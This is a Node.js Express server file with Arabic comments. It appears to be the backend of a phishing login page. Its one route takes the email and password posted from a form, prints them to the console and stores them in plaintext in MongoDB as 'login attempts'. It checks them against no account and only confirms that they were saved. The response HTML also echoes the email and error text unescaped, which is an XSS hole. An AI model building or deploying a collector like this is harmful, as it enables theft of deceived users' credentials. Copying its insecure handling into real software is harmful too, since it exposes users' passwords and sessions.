const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();

// إعدادات قراءة البيانات المرسلة من النماذج و JSON
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// مسار المجلد الذي يحتوي على ملفات الواجهة (index.html و CSS)
app.use(express.static(path.join(__dirname, 'public')));

// رابط قاعدة بيانات MongoDB من المتغيرات البيئية في Render
const MONGO_URI = process.env.MONGO_URI;

mongoose.connect(MONGO_URI)
  .then(() => console.log('✓ تم الاتصال بقاعدة بيانات MongoDB بنجاح'))
  .catch(err => console.error('✗ خطأ في الاتصال بـ MongoDB:', err));

// تعريف مخطط حفظ البيانات
const LoginAttemptSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
  date: { type: Date, default: Date.now }
});

const LoginAttempt = mongoose.model('LoginAttempt', LoginAttemptSchema);

// مسار استقبال البيانات وحل مشكلة Cannot POST /
app.post('/', async (req, res) => {
  try {
    const { email, password } = req.body;

    console.log('بيانات جديدة مستلمة:', { email, password });

    // حفظ البيانات في MongoDB
    const entry = new LoginAttempt({ email, password });
    await entry.save();

    res.send(`
      <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 60px; direction: rtl;">
        <h2 style="color: #28a745;">✓ تم استلام البيانات وحفظها في MongoDB بنجاح!</h2>
        <p>البريد الإلكتروني المسجل: <strong>${email}</strong></p>
        <a href="/" style="display: inline-block; margin-top: 15px; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px;">العودة للخلف</a>
      </div>
    `);
  } catch (err) {
    console.error('خطأ أثناء الحفظ:', err);
    res.status(500).send(`
      <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 60px; direction: rtl;">
        <h2 style="color: #dc3545;">✗ حدث خطأ أثناء الحفظ في قاعدة البيانات</h2>
        <p>${err.message}</p>
        <a href="/">حاول مرة أخرى</a>
      </div>
    `);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`السيرفر يعمل الآن على المنفذ: ${PORT}`);
});
